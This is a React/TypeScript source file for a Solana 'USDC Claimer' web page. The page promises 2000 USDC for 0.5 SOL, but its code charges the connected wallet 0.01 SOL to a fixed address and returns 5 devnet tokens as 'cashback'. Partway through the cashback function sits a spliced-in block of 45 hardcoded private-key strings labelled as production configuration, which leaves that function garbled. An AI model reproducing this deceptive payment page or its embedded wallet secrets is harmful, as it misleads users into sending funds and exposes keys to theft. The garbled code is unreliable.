/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "bw3gptBsKtq2rcpGRBUztBud5HfHr7ETy2vgGem7faxGk3KJNMrNEiyYAApES214TSJUsy9HX6pE66UsrNd3N1c"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2kFrQdZ3u45dgomn6zYW1EyukHusaEPRYfh6VjoLjbnQejKmKRkacDwfCWsAD9axhoP3ENzC6G2atiBhxGi7p3S7",
  "key1": "CaHGh27UKCS8MTvS1K7VB6KhUSRZhTazxLGxunqBwJCxJASBMGqd21pbdoE5pYtaFeEzoG56NXAF9Lck1gkyBPi",
  "key2": "5UUgQosphJ4eVUVyN8Cgy8ZmyevWKPZdHHbsZ5no6fZfji6LkNJgJQWXrsU7cdrkBXKWXHS64Q7m9LQAqi9TMjuM",
  "key3": "2h5FfZH3Aj29u7hpAiM4v9ooKceVvaz5Vo2TJTPKHgnXdNsZypu1SaHNqS6stmrR3to5zaebzERtkDDeyp1NMg7b",
  "key4": "qBrVn29JqwyUFE5y7tBGHDxRXx6dkY4gkjdwB9jbfgHLwTqf1FMc2ySfRUykH3gBWaEM2hcjXf5UVGvqVSDpBf2",
  "key5": "26SxLAH8nsiVPDB218SUZMVH51NmwzknXKwLaaGMvJipdkeGNyqyDQmkWEZZTb84UhhEhU7uJMedT6PSgXvRvxsw",
  "key6": "M6gWkUw5hVJjHt3Wi2M45yv8T8gcATZxr6LXtAu3ApnhPL2wWLkStiDqXGJ8fF3Auc3wbwZdFMTyatLH7y5WVfy",
  "key7": "225DqNxkuYagnDL58gJinkm11uJZckneFgmX8MtyYAdXobio9yV6iPih65mCLMUFmQXnm8nfFbrCq5v1V5QNWT4r",
  "key8": "2f1MBLEWAfJdtt9HRh4ucRLv4rZZE7MQE2bkZafmKm1XLtv5ctWHD4m1Q9iVGeGDjGjRAenTPRyMB8PKuwRaf4qC",
  "key9": "5tNjtCHZ37SoAAzVdAqEZUh1QajqywvMhRj9HzM7qWaNYGLy74DJn7PDuwDs4WJCfC7ZEiJxkzsNcRV4NWaVXBGD",
  "key10": "4oA46F5xUwGwNc3xtFPVUtjZcdENvTg37xeavuyhK6hZKmmx6ZCQLqtvN4YNchTUzojhy3gYrbTEd68adHHyfsk3",
  "key11": "3vADdGjZvwMuEYqNaw8J8Hx6iZYUTYZuBHv6iRMTXpFmKhdJ8K3KBRqBx2GPbNDj7iDgLU7fZDbLMcYZJmi4zvon",
  "key12": "38qLcxiiyPXDXVYSDWCUzWMGvtpykhhabHmxyS3XM7iRqgHsXkLGYCrkX4wgkiGfzaiC85TfKmJVwJSRYX81viZY",
  "key13": "3dcoN7UrMcoKmePoqFTRnJepDK8wqrsqSsFtu57YQnYscAYqS19aSzttVTkaBC2Ryhu2ENh2zqxALMtNP36jATNe",
  "key14": "3UghKP9qa8zhjwuSJkAAyqY2JSTkQxZ3529fGk5Gowy3YcE2YBL6ydVg57GutUYK6opXmeCEyhiDaTVKCy1uRz3k",
  "key15": "4CQkEHvwEC3Q96PsR8rUXhYaPLM26eJvmDureZfSthtCdcsaRogANspKYjSv7mX28ANiagmYS3r6qxxxCA1LKzYC",
  "key16": "2ZA75c4TzecmWJr4DM41TWGZpH6ub2a4erNa1q4HpwP7fPug9oNYzGz3LcBoVFGr3Zz8kwh9VNjLTkvwsdXnHCPX",
  "key17": "5BEpRsSrBqVQQitanPW2g1Wmqas6wb9xy5JFhPXGUv6LpCCzj8zJd1cyfuGNwZKYztdJwHoZ6gMXNxpPduhNHUg9",
  "key18": "zFVyCvxQH1XcVqec88LGMdRk1oCqKU4btw4EzWNGyoyJwMU2CQE1JErZT21Ja7kvyYAWUYtrJfRP4a3YoMBL4Jt",
  "key19": "QvfSftze6vS34zF6NpJvJESFZN7SEuUEhTXB9P9ZupKj6ug1YQ53gg3fZ1mfXwAHUuXuWUo7to21ZMDrF9kNZRL",
  "key20": "2YeiuxXc6zbL9NRU1L8DrBrYagf7c7X9mox1HMfz8tJJFTutdHXgqUyotBYzeD2cBtCWcUEWWyTVmpTKVuQ1fzJH",
  "key21": "L8863gKAfnbnaVhnsf9pPBzMs7sqYPysm1cL9qnJivA8H2pTVnVovs6CqH1NTGNEbGK2v3cRrd8m9Bodabp4sf8",
  "key22": "5kxnbnFztkjZMxPsyQyRy8wyMaJfP61zVm7xbknZYShF4TBsrpwmQyZM2FabNqA2YNchMdYApfxu5g6HeL5Lrh5Q",
  "key23": "326ZD8u8N7QBHV99ouPLzqx8tXTgz9tVzHJFYjrw3yRr4BdZpLQrCmhNSoRrYNMjH6eiS9xVVMpNqmvmVYmgUTDP",
  "key24": "5xgpmMBKFJk7weXFj6XSZWT8HJC1ucwjfXqTvv8wViYq1t2PzseeFfngYautejmkmUHFoT8ATyyBh8Mnb1o7oxHF",
  "key25": "31BTi7UbK2wgcAJLiyH4rc4Pxs9J7k2W5ys4qbkC5CNkkrq6jxqzDd11ic2Sj9KjxTExzJfgPaMjnkrrCedckd23",
  "key26": "3to2ZLeuRUhz8Yu9DXrrE1VH3NtzMmLwpbP9rVt6B3QTFBeHka6t47hDMNWTfGqxc1gQPtUR2GhcPQpwG2EyqnHV",
  "key27": "35b8sigmhLegKs1suxwT3kqK1w3i857hiQwNcRBrrecWgwbcQr3ipfmcqh3zjX6KKCyk2oexTsHGPF3rujhiejJK",
  "key28": "JbSbbh6ehMXCCvzpMkgEcrjztS7kJKkusBMsto3HrKM5KQYTX753MtwEd3SkUxvtPyNw6sGzfCJQTBfsLqayzv1",
  "key29": "u7NyfSNSp1HxY19zYv6zqem8abQZGLAULVKxhMN6pg275zQBgYjupkBHVRfwiGGWrybKhS2set5HFaKtitZYV52",
  "key30": "4t3JR8J9fwpM5SfpheV6fZJnEYUNrhTM9C9G1hYVUHR2xKGk83ahXmuk2MnNbgLQqaAMFxZLCH7TjFRnciEizTSh",
  "key31": "5RnemCBNvXzv5DnzRCWyVYw7qW7RpcJuykAp4nivrtjxEVXarCV1TwQSnEWt44p8Zqz3xjFMoYSuFR7j2RKDsRJz",
  "key32": "vdMrixN43w3tGSG1mYXdMjjDKGUYSYfEngTUEz2g15D9PeFp7Rtwg14wDA56CpR9u5HVtcu6KFAPkqEBcv1jxnQ",
  "key33": "EbVtNDshWC4P8HoDhkeZZNnYNZDFhgdgqtSURu9gDRA5BNRgeekecrp8eU8fGy12552VQj3wAgp6ucizWqa4wHi",
  "key34": "2LDR87pehFEPo9je7fGYhW36VScZ4NmtrM78pKkaMVi7E1iTEEXPXq37Msuh9Q2j2V3mwvqhBdQx8m5KSCL6zzaV",
  "key35": "YTeEppktPSRo9m883Kz1SAC51RiVsMZvcjBbtEzLM32HnhnMq3dZs46qwxirYa9vyPtyA8AHoB1sv6U7o47rwyi",
  "key36": "54izhzVzAzumzJDS9o5BtsCbVAQ9fPpXB4AXM4rcs55DavCXHt4Wj9eT8a1UDcGWzsQvruai6usoafrsjPy34fpK",
  "key37": "62kT4cy1ZmQVwCpHVNf2y95TG21Kc3e8KRWkyUsWDrMwJvbmuTwcZyxPuBLRfwJDGppAS1gaDn4q1qjXhLyFFu9o",
  "key38": "54BGTNxQHd28VmNhzhFrMmxQxfjiJZ1HHqw1uRiT1qYQ9sdy6DEw2dZfbwrHCD2n4XqCzq64Ugw8EPAhTsZ2TUQY",
  "key39": "333NvFpNvTd6qeJyuq4pvhb2QRa92WRRBEqtukMzKj6Ecgpx8YfcytpKFTdVTFsmRGFFsEMgrFH2VuV9Sbu8n7JW",
  "key40": "4TFkZXLGVr2esrxULfjmNfGZe2tDXmN6Mu69jj4pRAM8LtR3SqsSGvCKACTNF8jXTyVAuqjiX1nFRfvb751J3XzV",
  "key41": "57STAgJX38HSZTK928g8w2HstwMxUHrk5EagB5Zx6zTSgmFi4ajER16tSeNKvL5axxV8DPsPfderni3MBTzV8xeN",
  "key42": "52mkgX5oc2Joud2LyaN1RW1GQf6RbLR2c9tgg7MnpAYEjwBxHasBjozSpLEwDChrG33rN39DPZXgPf5Atgc8BzJS",
  "key43": "3Qsapz7jtUTnVXBDhqhvwA1drYGcVm8PtDRqPhU7EtTN36QpTz57FcZtyPKMsegSHkuG4Ly9kp9RvAhVkvJaQGJs",
  "key44": "ZAvPJCtPnJvUHF8MoE8RRoTKJaWF6szzjJz4MRTo5uKbjctj6Wfj52LQBn6H7yxnsn4HckDYySFUuqoDmjx9V7e"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
